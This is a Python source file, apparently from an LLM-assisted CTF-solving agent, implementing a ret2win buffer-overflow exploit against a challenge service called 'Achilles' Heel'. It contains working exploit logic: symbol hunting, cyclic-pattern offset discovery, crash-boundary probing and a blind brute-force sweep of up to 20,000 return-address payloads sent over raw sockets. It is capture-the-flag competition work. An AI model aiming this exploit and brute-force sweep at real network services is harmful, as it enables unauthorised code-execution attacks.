"""
Puzzle 1 — Achilles' Heel (Pwn / Binary Exploitation, 175 pts)

A service reads your name into a fixed buffer with no bounds check (classic stack
smash). No canary, no PIE -> addresses are static. There's a "win" function in the
symbol table that's never called in normal flow (ret2win). Overflow the buffer to
the saved return address and overwrite it with win()'s address; win() prints the
flag. No shellcode needed.

Approach:
  1. Fetch the achilles_heel binary in-pod (solvers/_files).
  2. Analyze it: pwntools ELF (symbols -> win addr), and cyclic/pattern probing
     against the live service to find the exact offset to the saved RIP. The LLM
     reads objdump/nm output to disambiguate the win function + call convention.
  3. Send padding + win_addr over the socket; read back the flag.

Env: HAL_TARGET_IP/_PORT (the network service), plus the fetched binary.
"""
import re
import socket
import struct
from typing import List, Optional

from ._files import fetch_attachment
from ._http import find_flag


class AchillesSolver:
    def __init__(self, agent):
        self.agent = agent
        self.llm = getattr(agent, "llm", None)
        self.ip = agent.target_ip
        self.port = int(agent.target_port) if str(agent.target_port).isdigit() else 0
        self.binary: bytes = b""

    def solve(self) -> bool:
        print("=== Achilles' Heel Solver (ret2win) ===", flush=True)
        if not self.ip or not self.port:
            print("Missing target ip/port for the pwn service", flush=True)
            return False

        fetched = fetch_attachment(self.agent, "achilles_heel",
                                   target_paths=["/achilles_heel",
                                                 "/static/achilles_heel",
                                                 "/files/achilles_heel",
                                                 "/achilles_heel.bin"]) or b""
        # Guard against a probe returning a stray HTML page instead of the binary
        # (a target port may serve a web app). Require the ELF magic \x7fELF.
        if fetched[:4] == b"\x7fELF":
            self.binary = fetched
        elif fetched:
            print(f"Fetched {len(fetched)} bytes but not an ELF (starts {fetched[:16]!r}); "
                  f"ignoring — that source served something else, not the binary.", flush=True)
            self.binary = b""
        else:
            self.binary = b""

        win_addrs: List[int] = []
        if self.binary:
            win_addrs = self._find_win_addrs(self.binary)
            if not win_addrs:
                print("No win()-like symbol found; see disassembly dump above.", flush=True)
                return False
            print(f"Candidate win addresses: {[hex(a) for a in win_addrs]}", flush=True)
            offsets = self._candidate_offsets()
            for win in win_addrs:
                for off in offsets:
                    if self._attempt(off, win):
                        return True
            print("No (offset, win) combination produced a flag from the binary.", flush=True)
            return False

        # NO BINARY IN POD (confirmed 3x: files:[], resources:[], raw socket). But
        # the hints describe a BLIND ret2win that needs no file: no PIE ⇒ fixed load
        # base and a small win() address window; overflowing the socket costs ZERO
        # flag-submission quota. So brute-force it live: find the offset, then sweep
        # the win() address range watching each reply for HALCTF{.
        print("Binary not in pod — attempting BLIND ret2win over the socket "
              "(no-PIE fixed addresses; socket traffic is quota-free).", flush=True)
        return self._solve_blind()

    def _solve_blind(self) -> bool:
        """Blind ret2win with no binary. Two phases, both over the raw socket
        (quota-free): (1) find the padding-to-saved-RIP offset, (2) sweep the win()
        address range. On a non-PIE x86-64 intro pwn, the loader base is 0x400000
        and win() lives in a small aligned window of .text — a few hundred
        addresses, trivially brute-forceable inside the run budget."""
        import time
        deadline = time.monotonic() + 600  # 10 min, deep inside the 15-min run cap

        # Phase 1: PIN the offset first. Crossing all ~23 common offsets with the
        # address sweep is what blows the time budget; nailing the offset lets us
        # sweep addresses under just 1-2 candidates. We probe the crash boundary
        # (Hint 4: "work out how many bytes of padding get you there"), then order
        # the common offsets so the discovered/likely ones go first.
        pinned = self._pin_offset()
        common = self._candidate_offsets()
        if pinned is not None:
            # The pin is approximate (crash boundary brackets the RIP, exact byte
            # unknown), so try a WINDOW around it first — every 8-multiple within
            # ±24 — before falling back to the full common list. This makes an
            # off-by-a-few pin still resolve in the first couple of passes.
            window = [pinned + d for d in (0, -8, 8, -16, 16, -24, 24) if pinned + d >= 8]
            offsets = window + [o for o in common if o not in window]
            print(f"Blind offset pinned≈{pinned}; window-first order: {offsets[:8]}...", flush=True)
        else:
            offsets = common
            print(f"Blind offset not pinned; trying candidates: {offsets}", flush=True)

        # Phase 2: win() address candidates for a non-PIE x86-64 binary. Tiered by
        # likelihood so the probable answer is hit in the first few hundred tries:
        #   Tier 1: 16-aligned entries in the hot zone 0x401100-0x401400 (where an
        #           intro binary's user functions almost always sit), EACH with a
        #           +1 realign variant. The +1 skips the 1-byte `push rbp` prologue,
        #           flipping RSP alignment by 8 — this is the blind fix for the
        #           x86-64 movaps/SSE alignment fault (a correct win() addr can
        #           otherwise SIGSEGV inside a libc call before printing the flag).
        #   Tier 2: 16-aligned across the full .text range.
        #   Tier 3: step-4 fill (in case win() isn't 16-aligned).
        base_lo, base_hi = 0x401000, 0x402000
        hot_lo, hot_hi = 0x401100, 0x401400
        addrs: List[int] = []
        seen_a = set()

        def _add(a: int) -> None:
            if a not in seen_a:
                seen_a.add(a); addrs.append(a)

        for a in range(hot_lo, hot_hi, 16):   # tier 1: hot zone + realign variant
            _add(a); _add(a + 1)
        for a in range(base_lo, base_hi, 16):  # tier 2: all 16-aligned
            _add(a)
        for a in range(base_lo, base_hi, 4):   # tier 3: step-4 fill
            _add(a)
        print(f"Blind win() sweep: {len(addrs)} candidates (hot zone + realign "
              f"variants first, then {hex(base_lo)}..{hex(base_hi)})", flush=True)

        self._bits = 64
        attempts = 0
        MAX_ATTEMPTS = 20000  # hard cap regardless of clock (belt + suspenders)
        # Short per-attempt timeout: a non-matching address just drops/ignores us,
        # so we don't need to wait long. Keeps worst-case throughput high.
        SWEEP_TIMEOUT = 1.5
        for off in offsets:
            print(f"[blind] sweeping {len(addrs)} addresses at offset {off}...", flush=True)
            for win in addrs:
                if time.monotonic() > deadline or attempts >= MAX_ATTEMPTS:
                    print(f"Blind sweep stopped after {attempts} attempts "
                          f"(time/limit budget).", flush=True)
                    return False
                attempts += 1
                if attempts % 100 == 0:  # heartbeat so we never hit the 2-min silence kill
                    print(f"[blind] {attempts} attempts... (offset={off}, at {hex(win)})",
                          flush=True)
                # Quiet attempt (log=False) — thousands of round-trips otherwise flood stdout.
                if self._attempt(off, win, log=False, timeout=SWEEP_TIMEOUT):
                    print(f"BLIND ret2win hit: offset={off} win={hex(win)} "
                          f"after {attempts} attempts", flush=True)
                    return True
        print(f"Blind ret2win exhausted {attempts} (offset,addr) combos with no flag. "
              f"Widen the range/offsets and retry — socket traffic is quota-free.", flush=True)
        return False

    def _pin_offset(self) -> Optional[int]:
        """Locate the padding-to-saved-RIP offset over the socket (Hint 4).
        Two signals: (a) cyclic echo — if the crash leaks a stack value that maps
        back into our De Bruijn pattern, that IS the offset; (b) crash boundary —
        the input length at which the service stops replying normally, which brackets
        the offset. Returns a best-estimate offset or None."""
        # (a) cyclic echo — most precise when it works.
        cyc = self._discover_offset_cyclic()
        if cyc is not None and 8 <= cyc <= 512:
            return cyc

        # (b) crash boundary: baseline a short benign reply, then grow the payload
        # and find the smallest length whose behavior changes (no/blank reply, or a
        # dropped connection). The saved RIP sits ~at that boundary; round DOWN to a
        # multiple of 8 as the offset estimate. All quota-free socket traffic.
        baseline = self._send_recv(b"A" * 8, log=False)
        if baseline is None:
            # Service unreachable / transient failure — a bad baseline would make
            # every later probe look "changed" and yield a garbage offset (est=0).
            # Return None so the sweep uses the full common-offset list instead.
            print("[blind] crash-boundary baseline probe failed; not pinning offset.",
                  flush=True)
            return None
        base_ok = True
        prev = 8
        for length in (16, 24, 32, 40, 48, 56, 64, 72, 80, 96, 112, 128, 160, 200, 256):
            resp = self._send_recv(b"A" * length, log=False)
            changed = (resp is None) or (base_ok and len(resp or b"") == 0)
            if changed:
                # Crash appeared between `prev` and `length`; RIP is near here.
                # Estimate at the midpoint (8-rounded) — better centered than
                # rounding down to prev; the ±window in _solve_blind absorbs slack.
                est = ((prev + length) // 2 // 8) * 8
                print(f"[blind] crash boundary between {prev} and {length} bytes -> "
                      f"offset estimate ~{est}", flush=True)
                return est
            prev = length
        return None

    def _find_win_addrs(self, blob: bytes) -> List[int]:
        """Parse the ELF symbol table with pyelftools (tiny, no capstone/unicorn
        pull-in) and rank win-like function names first. Fall back to the LLM (over
        the symbol listing) if names are obfuscated, then to nm."""
        addrs: List[int] = []
        try:
            import io
            from elftools.elf.elffile import ELFFile
            from elftools.elf.sections import SymbolTableSection

            elf = ELFFile(io.BytesIO(blob))
            self._bits = 64 if elf.elfclass == 64 else 32
            named: dict = {}
            for section in elf.iter_sections():
                # Only real symbol tables (.symtab/.dynsym). NOT .gnu.version, whose
                # GNUVerSymSection also has iter_symbols() but yields version entries
                # with no st_value — a loose hasattr check raised KeyError on those.
                if not isinstance(section, SymbolTableSection):
                    continue
                for sym in section.iter_symbols():
                    val = sym["st_value"]
                    if sym.name and isinstance(val, int) and val:
                        named.setdefault(sym.name, val)
            print(f"ELF class={elf.elfclass} bits={self._bits} symbols={len(named)}", flush=True)

            def rank(name: str) -> int:
                n = name.lower()
                for i, kw in enumerate(("win", "flag", "shell", "secret", "backdoor",
                                        "give", "print_flag", "cat", "system")):
                    if kw in n:
                        return i
                return 99
            for name in sorted(named, key=rank):
                if rank(name) < 99:
                    addrs.append(named[name])
                    print(f"  win-like symbol {name} @ {hex(named[name])}", flush=True)
            # If nothing obvious, ask the LLM over the function list.
            if not addrs and self.llm:
                addrs += self._llm_pick_win(named)
            # As a last resort, include all symbol addrs (bounded).
            if not addrs:
                addrs = list(named.values())[:20]
            return addrs
        except Exception as e:
            print(f"pyelftools analysis failed ({e}); trying nm fallback", flush=True)
            return self._fallback_symbols(blob)

    def _llm_pick_win(self, named: dict) -> List[int]:
        if not self.llm:
            return []
        listing = "\n".join(f"{name} = {hex(a)}" for name, a in list(named.items())[:200])
        prompt = ("This is a symbol table from a ret2win CTF binary (no PIE). Which "
                  "function is the 'win' function that prints the flag and is never "
                  "called in normal flow? Reply with ONLY its hex address (0x...).\n\n"
                  + listing)
        ans = self.llm.ask(prompt, max_tokens=32)
        out = []
        if ans:
            for m in re.findall(r'0x[0-9a-fA-F]+', ans):
                out.append(int(m, 16))
        return out

    def _fallback_symbols(self, blob: bytes) -> List[int]:
        """No pwntools: run nm/objdump on a temp file."""
        import subprocess
        import tempfile
        addrs: List[int] = []
        try:
            with tempfile.NamedTemporaryFile(delete=False) as f:
                f.write(blob)
                bpath = f.name
            self._bits = 64  # assume x86-64; adjusted below if 32-bit detected
            out = subprocess.run(["nm", bpath], capture_output=True, text=True, timeout=20).stdout
            print(f"nm output:\n{out[:1500]}", flush=True)
            for line in out.splitlines():
                parts = line.split()
                if len(parts) >= 3 and any(kw in parts[2].lower()
                                           for kw in ("win", "flag", "shell", "secret")):
                    try:
                        addrs.append(int(parts[0], 16))
                    except ValueError:
                        pass
        except Exception as e:
            print(f"nm fallback failed: {e}", flush=True)
        return addrs

    def _candidate_offsets(self) -> List[int]:
        """Offset to saved RIP. Try cyclic-pattern discovery first (if the service
        reports a crash), else sweep common small-buffer offsets."""
        offsets: List[int] = []
        cyclic_off = self._discover_offset_cyclic()
        if cyclic_off is not None:
            offsets.append(cyclic_off)
        # Common buffer(+saved rbp) offsets for typical intro pwn: buf 32/64/... +8.
        for buf in (16, 24, 32, 40, 48, 56, 64, 72, 88, 100, 104, 120, 128, 136, 200, 256):
            offsets.append(buf + 8)   # buffer + saved rbp (x86-64)
            offsets.append(buf)
        # de-dup preserving order
        seen, out = set(), []
        for o in offsets:
            if o not in seen:
                seen.add(o)
                out.append(o)
        return out

    def _discover_offset_cyclic(self) -> Optional[int]:
        """Send a De Bruijn cyclic pattern; if the service echoes back a fault
        address (leaked saved RIP), compute the offset from it. Best-effort —
        uses a hand-rolled cyclic so we don't need pwntools (capstone/unicorn)."""
        try:
            pattern = self._cyclic(400)
            resp = self._send_recv(pattern)
            if not resp:
                return None
            # Look for a hex value echoed back; its 4-byte prefix locates the offset.
            for m in re.finditer(rb'0x([0-9a-fA-F]{8,16})', resp):
                val = int(m.group(1), 16)
                chunk = struct.pack("<Q", val)[:4]
                off = self._cyclic_find(pattern, chunk)
                if off is not None and off > 0:
                    print(f"cyclic offset discovered: {off}", flush=True)
                    return off
        except Exception as e:
            print(f"cyclic discovery failed: {e}", flush=True)
        return None

    @staticmethod
    def _cyclic(length: int, width: int = 4) -> bytes:
        """De Bruijn sequence over lowercase ASCII (pwntools-compatible default:
        26 chars, subsequence width 4). Every `width`-byte window is unique, so a
        leaked window maps back to a single offset."""
        alphabet = b"abcdefghijklmnopqrstuvwxyz"
        k = len(alphabet)
        a = [0] * (k * width)
        seq: List[int] = []

        def db(t: int, p: int) -> None:
            if len(seq) >= length:
                return
            if t > width:
                if width % p == 0:
                    seq.extend(a[1:p + 1])
            else:
                a[t] = a[t - p]
                db(t + 1, p)
                for j in range(a[t - p] + 1, k):
                    a[t] = j
                    db(t + 1, t)

        db(1, 1)
        out = bytes(alphabet[i] for i in seq[:length])
        # If recursion produced fewer than requested (rare for small length), tile.
        while len(out) < length:
            out += out
        return out[:length]

    @staticmethod
    def _cyclic_find(pattern: bytes, chunk: bytes) -> Optional[int]:
        """Index of `chunk` (a leaked window) within the cyclic `pattern`."""
        idx = pattern.find(chunk)
        return idx if idx >= 0 else None

    def _attempt(self, offset: int, win_addr: int, log: bool = True,
                 timeout: float = 5.0) -> bool:
        bits = getattr(self, "_bits", 64)
        pack = struct.pack("<Q", win_addr) if bits == 64 else struct.pack("<I", win_addr)
        payload = b"A" * offset + pack + b"\n"
        resp = self._send_recv(payload, timeout=timeout, log=log)
        if not resp:
            return False
        flag = find_flag(resp.decode("latin1"))
        if flag:
            print(f"Flag via offset={offset} win={hex(win_addr)}", flush=True)
            return self.agent.submit_flag(flag, self.agent.challenge_id)
        return False

    def _send_recv(self, payload: bytes, timeout: float = 5.0,
                   log: bool = True) -> Optional[bytes]:
        # log=False during the address sweep — thousands of round-trips would
        # otherwise flood stdout and slow the run.
        try:
            with socket.create_connection((self.ip, self.port), timeout=timeout) as s:
                s.settimeout(timeout)
                try:
                    greeting = s.recv(4096)
                    if greeting and log:
                        print(f"  <- {greeting[:120]!r}", flush=True)
                except Exception:
                    pass
                s.sendall(payload)
                chunks = []
                try:
                    while True:
                        data = s.recv(4096)
                        if not data:
                            break
                        chunks.append(data)
                except Exception:
                    pass
                resp = b"".join(chunks)
                if log:
                    print(f"  -> sent {len(payload)}B, recv {len(resp)}B: {resp[:120]!r}", flush=True)
                return resp
        except Exception as e:
            if log:
                print(f"socket to {self.ip}:{self.port} failed: {e}", flush=True)
            return None
